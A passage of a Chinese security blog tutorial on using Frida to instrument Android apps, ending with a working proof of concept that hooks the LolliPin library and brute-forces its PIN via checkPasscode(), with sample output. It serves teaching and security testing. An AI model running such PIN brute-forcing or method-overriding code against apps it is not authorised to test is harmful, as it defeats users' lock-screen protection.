		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p>现在可以实时编辑的上述JS代码来调用你的Android应用</p>
<h3>0x06 Building your own tools</h3>
<hr>
<p>frida提供的几个工具frida-trace, frida-repl…绝逼非常有用,建议阅读Functions 和 Messages章节来了解Frida APIs,</p>
<p>首先,使用frida的API attach上需要注入的app</p>
<div>
<div id="highlighter_662169" class="syntaxhighlighter  python">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python plain">session </code><code class="python keyword">=</code> <code class="python plain">frida.get_remote_device().attach(</code><code class="python string">"com.mahh.secretsafe"</code><code class="python plain">)</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p><code>session</code>对象允许你获取信息,同时也可以操作目标进程.比如,可以调用<code>enumerate_modules()</code>方法来获取进程中加载模块的host信息.</p>
<div>
<div id="highlighter_886167" class="syntaxhighlighter  python">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python plain">&gt;&gt;&gt; </code><code class="python keyword">print</code> <code class="python plain">session.enumerate_modules()</code></div>
<div class="line number2 index1 alt1"><code class="python plain">[Module(name</code><code class="python keyword">=</code><code class="python string">"app_process"</code><code class="python plain">, base_address</code><code class="python keyword">=</code><code class="python value">0x40096000</code><code class="python plain">, size</code><code class="python keyword">=</code><code class="python value">8192</code><code class="python plain">, path</code><code class="python keyword">=</code><code class="python string">"/system/bin/app_process"</code><code class="python plain">), Module(name</code><code class="python keyword">=</code><code class="python string">"linker"</code><code class="python plain">, base_address</code><code class="python keyword">=</code><code class="python value">0x4009a000</code><code class="python plain">, size</code><code class="python keyword">=</code><code class="python value">61440</code><code class="python plain">, path</code><code class="python keyword">=</code><code class="python string">"/system/bin/linker"</code><code class="python plain">), Module(name</code><code class="python keyword">=</code><code class="python string">"libcutils.so"</code><code class="python plain">, base_address</code><code class="python keyword">=</code><code class="python value">0x400b0000</code><code class="python plain">, size</code><code class="python keyword">=</code><code class="python value">36864</code><code class="python plain">, path</code><code class="python keyword">=</code><code class="python string">"/system/lib/libcutils.so"</code><code class="python plain">), Module(name</code><code class="python keyword">=</code><code class="python string">"liblog.so"</code><code class="python plain">, base_address</code><code class="python keyword">=</code><code class="python value">0x400bb000</code><code class="python plain">, size</code><code class="python keyword">=</code><code class="python value">12288</code><code class="python plain">, path</code><code class="python keyword">=</code><code class="python string">"/system/lib/liblog.so"</code><code class="python plain">), Module(name</code><code class="python keyword">=</code><code class="python string">"libc.so"</code><code class="python plain">, base_address</code><code class="python keyword">=</code><code class="python value">0x400c0000</code><code class="python plain">, size</code><code class="python keyword">=</code><code class="python value">53248</code><code class="python plain">, path</code><code class="python keyword">=</code><code class="python string">"/system/lib/libc.so"</code><code class="python plain">), Module(name</code><code class="python keyword">=</code><code class="python string">"libstdc++.so"</code><code class="python plain">, base_address</code><code class="python keyword">=</code><code class="python value">0x4011b000</code><code class="python plain">, size</code><code class="python keyword">=</code><code class="python value">4096</code><code class="python plain">, path</code><code class="python keyword">=</code><code class="python string">"/system/lib/libstdc++.so"</code><code class="python plain">), Module(name</code><code class="python keyword">=</code><code class="python string">"libm.so"</code><code class="python plain">, base_address</code><code class="python keyword">=</code><code class="python value">0x4011e000</code><code class="python plain">, size</code><code class="python keyword">=</code><code class="python value">98304</code><code class="python plain">, path</code><code class="python keyword">=</code><code class="python string">"/system/lib/libm.so"</code><code class="python plain">)</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>然后使用Javascript API,通过<code>session</code>的create_script()方法放入JavaScript代码块.JavaScript API可以用来插桩目标app的类.在这个API中有些针对android的例子,下面是一些简单的案例:</p>
<p>取得一个类的js封装:</p>
<div>
<div id="highlighter_541934" class="syntaxhighlighter  python">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python plain">Dalvik.perform(function () {</code></div>
<div class="line number2 index1 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var MyClass </code><code class="python keyword">=</code> <code class="python plain">Dalvik.use(</code><code class="python string">"com.mdsec.MyClass"</code><code class="python plain">);</code></div>
<div class="line number3 index2 alt2"><code class="python plain">});</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>如果类的构造方法有一个String对象的参数,应该用如下方式创建类的实例:</p>
<div>
<div id="highlighter_262471" class="syntaxhighlighter  javascript">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="javascript keyword">var</code> <code class="javascript plain">MyClass = Dalvik.use(</code><code class="javascript string">"com.mdsec.MyClass"</code><code class="javascript plain">);</code></div>
<div class="line number2 index1 alt1"><code class="javascript keyword">var</code> <code class="javascript plain">MyClassInstance = MyClass.$</code><code class="javascript keyword">new</code><code class="javascript plain">(“MySecretString”);</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>只需要加上对应的参数就可以调用刚才新建实例的方法.例如,调用MyClass类的MyMethod方法:</p>
<div>
<div id="highlighter_418851" class="syntaxhighlighter  javascript">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="javascript keyword">var</code> <code class="javascript plain">result = MyClassInstance.MyMethod();</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>如果想替换MyMethod方法的实现来return false,使用如下代码:</p>
<div>
<div id="highlighter_730381" class="syntaxhighlighter  javascript">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="javascript plain">MyClass.MyMethod.implementation = </code><code class="javascript keyword">function</code><code class="javascript plain">()</code></div>
<div class="line number2 index1 alt1"><code class="javascript plain">{</code></div>
<div class="line number3 index2 alt2"><code class="javascript spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="javascript keyword">return</code> <code class="javascript keyword">false</code><code class="javascript plain">;</code></div>
<div class="line number4 index3 alt1"><code class="javascript plain">};</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>Android Context(上下文)用于获取对应app相关信息以及其运行环境.所以其被广泛用于app中,需要找一种方法来访问他.获取Android Context如下代码非常有效:</p>
<div>
<div id="highlighter_816100" class="syntaxhighlighter  javascript">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="javascript keyword">var</code> <code class="javascript plain">currentApplication = Dalvik.use(</code><code class="javascript string">"android.app.ActivityThread"</code><code class="javascript plain">).currentApplication(); </code></div>
<div class="line number2 index1 alt1"><code class="javascript keyword">var</code> <code class="javascript plain">context = currentApplication.getApplicationContext();</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>接下来需要用到上文中提到的create_script()方法用于注册这段js代码到app session中.</p>
<div>
<div id="highlighter_228181" class="syntaxhighlighter  python">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python plain">script </code><code class="python keyword">=</code> <code class="python plain">session.create_script(jscode)</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>为了接收从Python session中JavaScript代码返回的数据,还需要注册一个message handler.注册一个message handler先要创建方法:</p>
<div>
<div id="highlighter_308696" class="syntaxhighlighter  python">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python keyword">def</code> <code class="python plain">on_message(message, data):</code></div>
<div class="line number2 index1 alt1"><code class="python functions">print</code> <code class="python plain">message</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>然后通过调用<code>on()</code>方法注册event handler:</p>
<div>
<div id="highlighter_658798" class="syntaxhighlighter  python">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python plain">script.on(</code><code class="python string">'message'</code><code class="python plain">, on_message)</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>可以通过JS方法<code>send()</code>给message handler发送消息.例如,使用如下代码讲Context对象发送给Python客户端:</p>
<div>
<div id="highlighter_941677" class="syntaxhighlighter  python">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python plain">Dalvik.perform(function () {</code></div>
<div class="line number2 index1 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var currentApplication </code><code class="python keyword">=</code> <code class="python plain">Dalvik.use(</code><code class="python string">"android.app.ActivityThread"</code><code class="python plain">).currentApplication();</code></div>
<div class="line number3 index2 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">var context </code><code class="python keyword">=</code> <code class="python plain">currentApplication.getApplicationContext();</code></div>
<div class="line number4 index3 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">send(context);</code></div>
<div class="line number5 index4 alt2"><code class="python plain">});</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>结果会返回app的context对象的地址:</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7aef3baef3856394399" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">{u'type': u'send', u'payload': {u'$handle': u'0x1d50079a', u'$classHandle': u'0x1d5007e6', u'$weakRef': 20}}
</textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aef3baef3856394399-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3baef3856394399-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aef3baef3856394399-1"><span class="crayon-sy">{</span><span class="crayon-i">u</span><span class="crayon-s">'type'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-s">'send'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-s">'payload'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-i">u</span><span class="crayon-s">'$handle'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-s">'0x1d50079a'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-s">'$classHandle'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-s">'0x1d5007e6'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-s">'$weakRef'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-sy">}</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3baef3856394399-2">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0018 seconds] -->
<p>现在已经掌握frida的基础知识,现在可以实战演练如何破解<a href="https://github.com/OrangeGangsters/LolliPin">LolliPin</a>锁屏库.我们创建一个使用<code>LolliPin</code>的app截图如下:</p>
<p><img src="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/2015041211275631118.png" alt=""></p>
<p>PIN码生效后,可以使用插桩暴力破击.要达到这个目的首先要了解pin码验证是如何实现的.AppLockImpl类中验证方法如下:</p>
<p><img src="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/2015041211275636961.png" alt=""></p>
<p>现在咱们忽略LolliPin的其他漏洞,就搞PIN码的暴露破解,这是客户端认证通过都会受到的分析.</p>
<p>可以创建一个AppLockImpl的实例,但是为了节约内存我们直接调用已有的.分析发现AppLockImpl被调用在LockManager的getAppLock()中,这个就仅仅返回了AppLock对象.而AppLock是抽象类AppLockImpl的具现.</p>
<p><img src="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/2015041211275755121.png" alt=""></p>
<p>LockManager有一个帮助方法用于返回自己的实例.</p>
<p><img src="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/2015041211275783862.png" alt=""></p>
<p>结合上面的分析,咱们可以通过LockManager.getInstance()得到LockManager的实例,再调用getAppLock()得到AppLock.最后就可以调用AppLock的 checkPasscode()方法了.</p>
<div>
<div id="highlighter_412890" class="syntaxhighlighter  javascript">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="javascript keyword">var</code> <code class="javascript plain">LockManager = Dalvik.use(</code><code class="javascript string">"com.github.orangegangsters.lollipin.lib.managers.LockManager"</code><code class="javascript plain">);</code></div>
<div class="line number2 index1 alt1"><code class="javascript keyword">var</code> <code class="javascript plain">LockManagerInstance = LockManager.getInstance();</code></div>
<div class="line number3 index2 alt2"><code class="javascript keyword">var</code> <code class="javascript plain">AppLock = LockManagerInstance.getAppLock();</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>通过for循环调用checkPasscode()来达到暴力破解的目的:</p>
<div>
<div id="highlighter_622010" class="syntaxhighlighter  javascript">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="javascript keyword">for</code><code class="javascript plain">(</code><code class="javascript keyword">var</code> <code class="javascript plain">i=1230; i&lt;1235; i++)</code></div>
<div class="line number2 index1 alt1"><code class="javascript plain">{</code></div>
<div class="line number3 index2 alt2"><code class="javascript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="javascript keyword">var</code> <code class="javascript plain">result = AppLock.checkPasscode(i+</code><code class="javascript string">""</code><code class="javascript plain">);</code></div>
<div class="line number4 index3 alt1"><code class="javascript spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="javascript plain">send(i + </code><code class="javascript string">": "</code> <code class="javascript plain">+ result);</code></div>
<div class="line number5 index4 alt2"><code class="javascript plain">}</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<p>此循环将尝试1230到1235的pin码(已知PIN为1234…),最后利用空字符串将pin码连接起来做个强制转换再打印出来.运行脚本效果如下:</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7aef3baf0b403066869" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; position: absolute; z-index: 2;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">[*] Bruteforcing PIN code
[*] Testing PIN 1230: false
[*] Testing PIN 1231: false
[*] Testing PIN 1232: false
[*] Testing PIN 1233: false
[*] Testing PIN 1234: true
</textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7aef3baf0b403066869-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3baf0b403066869-2">2</div><div class="crayon-num" data-line="crayon-55a7aef3baf0b403066869-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3baf0b403066869-4">4</div><div class="crayon-num" data-line="crayon-55a7aef3baf0b403066869-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-55a7aef3baf0b403066869-6">6</div><div class="crayon-num" data-line="crayon-55a7aef3baf0b403066869-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7aef3baf0b403066869-1"><span class="crayon-sy">[</span><span class="crayon-o">*</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-e">Bruteforcing </span><span class="crayon-e">PIN </span><span class="crayon-i">code</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3baf0b403066869-2"><span class="crayon-sy">[</span><span class="crayon-o">*</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-e">Testing </span><span class="crayon-i">PIN</span><span class="crayon-h"> </span><span class="crayon-cn">1230</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span></div><div class="crayon-line" id="crayon-55a7aef3baf0b403066869-3"><span class="crayon-sy">[</span><span class="crayon-o">*</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-e">Testing </span><span class="crayon-i">PIN</span><span class="crayon-h"> </span><span class="crayon-cn">1231</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3baf0b403066869-4"><span class="crayon-sy">[</span><span class="crayon-o">*</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-e">Testing </span><span class="crayon-i">PIN</span><span class="crayon-h"> </span><span class="crayon-cn">1232</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span></div><div class="crayon-line" id="crayon-55a7aef3baf0b403066869-5"><span class="crayon-sy">[</span><span class="crayon-o">*</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-e">Testing </span><span class="crayon-i">PIN</span><span class="crayon-h"> </span><span class="crayon-cn">1233</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span></div><div class="crayon-line crayon-striped-line" id="crayon-55a7aef3baf0b403066869-6"><span class="crayon-sy">[</span><span class="crayon-o">*</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-e">Testing </span><span class="crayon-i">PIN</span><span class="crayon-h"> </span><span class="crayon-cn">1234</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">true</span></div><div class="crayon-line" id="crayon-55a7aef3baf0b403066869-7">&nbsp;</div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0050 seconds] -->
<p>最后完整的frida代码块如下:</p>
<div>
<div id="highlighter_940860" class="syntaxhighlighter  python">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
<div class="line number7 index6 alt2">7</div>
<div class="line number8 index7 alt1">8</div>
<div class="line number9 index8 alt2">9</div>
<div class="line number10 index9 alt1">10</div>
<div class="line number11 index10 alt2">11</div>
<div class="line number12 index11 alt1">12</div>
<div class="line number13 index12 alt2">13</div>
<div class="line number14 index13 alt1">14</div>
<div class="line number15 index14 alt2">15</div>
<div class="line number16 index15 alt1">16</div>
<div class="line number17 index16 alt2">17</div>
<div class="line number18 index17 alt1">18</div>
<div class="line number19 index18 alt2">19</div>
<div class="line number20 index19 alt1">20</div>
<div class="line number21 index20 alt2">21</div>
<div class="line number22 index21 alt1">22</div>
<div class="line number23 index22 alt2">23</div>
<div class="line number24 index23 alt1">24</div>
<div class="line number25 index24 alt2">25</div>
<div class="line number26 index25 alt1">26</div>
<div class="line number27 index26 alt2">27</div>
<div class="line number28 index27 alt1">28</div>
<div class="line number29 index28 alt2">29</div>
<div class="line number30 index29 alt1">30</div>
<div class="line number31 index30 alt2">31</div>
<div class="line number32 index31 alt1">32</div>
<div class="line number33 index32 alt2">33</div>
<div class="line number34 index33 alt1">34</div>
<div class="line number35 index34 alt2">35</div>
<div class="line number36 index35 alt1">36</div>
<div class="line number37 index36 alt2">37</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="python comments"># LolliPin bruteforce proof of concept</code></div>
<div class="line number2 index1 alt1"><code class="python comments"># Author: Dominic Chell - @domchell</code></div>
<div class="line number3 index2 alt2"></div>
<div class="line number4 index3 alt1"><code class="python keyword">import</code> <code class="python plain">frida,sys</code></div>
<div class="line number5 index4 alt2"></div>
<div class="line number6 index5 alt1"><code class="python keyword">def</code> <code class="python plain">print_result(message):</code></div>
<div class="line number7 index6 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python string">"[*] Testing PIN %s"</code> <code class="python keyword">%</code><code class="python plain">(message)</code></div>
<div class="line number8 index7 alt1"></div>
<div class="line number9 index8 alt2"><code class="python keyword">def</code> <code class="python plain">on_message(message, data):</code></div>
<div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">print_result(message[</code><code class="python string">'payload'</code><code class="python plain">])</code></div>
<div class="line number11 index10 alt2"></div>
<div class="line number12 index11 alt1"><code class="python plain">jscode </code><code class="python keyword">=</code> <code class="python comments">"""</code></div>
<div class="line number13 index12 alt2"></div>
<div class="line number14 index13 alt1"><code class="python comments">Dalvik.perform(function () {</code></div>
<div class="line number15 index14 alt2"></div>
<div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">var LockManager = Dalvik.use("com.github.orangegangsters.lollipin.lib.managers.LockManager");</code></div>
<div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">var LockManagerInstance = LockManager.getInstance();</code></div>
<div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">var AppLock = LockManagerInstance.getAppLock();</code></div>
<div class="line number19 index18 alt2"></div>
<div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">for(var i=1230; i&lt;1235; i++)</code></div>
<div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">{</code></div>
<div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">var result = AppLock.checkPasscode(i+"");</code></div>
<div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">send(i + ": " + result);</code></div>
<div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">}</code></div>
<div class="line number25 index24 alt2"><code class="python comments">});</code></div>
<div class="line number26 index25 alt1"><code class="python comments">"""</code></div>
<div class="line number27 index26 alt2"></div>
<div class="line number28 index27 alt1"><code class="python plain">process </code><code class="python keyword">=</code> <code class="python plain">frida.get_device_manager().enumerate_devices()[</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">].attach(</code><code class="python string">"com.mahh.secretsafe"</code><code class="python plain">)</code></div>
<div class="line number29 index28 alt2"><code class="python plain">session </code><code class="python keyword">=</code> <code class="python plain">process.session</code></div>
<div class="line number30 index29 alt1"></div>
<div class="line number31 index30 alt2"><code class="python plain">script </code><code class="python keyword">=</code> <code class="python plain">session.create_script(jscode)</code></div>
<div class="line number32 index31 alt1"><code class="python plain">script.on(</code><code class="python string">'message'</code><code class="python plain">, on_message)</code></div>
<div class="line number33 index32 alt2"></div>
<div class="line number34 index33 alt1"><code class="python functions">print</code> <code class="python string">"[*] Bruteforcing PIN code"</code></div>
<div class="line number35 index34 alt2"></div>
<div class="line number36 index35 alt1"><code class="python plain">script.load()</code></div>
<div class="line number37 index36 alt2"><code class="python plain">sys.stdin.read()</code></div>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<h3>0x07 reference</h3>
<hr>
<p><a href="http://www.frida.re/docs/installation/">http://www.frida.re/docs/installation/</a></p>
<p><a href="http://www.frida.re/docs/android/">http://www.frida.re/docs/android/</a></p>
<p><a href="http://www.frida.re/docs/javascript-api/">http://www.frida.re/docs/javascript-api/</a></p>
<p><a href="http://www.frida.re/docs/functions/">http://www.frida.re/docs/functions/</a></p>
<p><a href="http://www.frida.re/docs/messages/">http://www.frida.re/docs/messages/</a></p>
<p><a href="http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html">http://blog.mdsec.co.uk/2015/04/instrumenting-android-applications-with.html</a></p>
<p>转载自:http://drops.wooyun.org/tools/5602 &nbsp;原文作者:<a class="url" href="http://www.wooyun.org/whitehats/%E7%98%A6%E8%9B%9F%E8%88%9E" rel="external nofollow">瘦蛟舞</a></p>
<p>&nbsp;</p>
<p class="tags"></p>

<div class="date">
  <span class="day">14</span>
  <span class="month">2015-04</span>
</div>
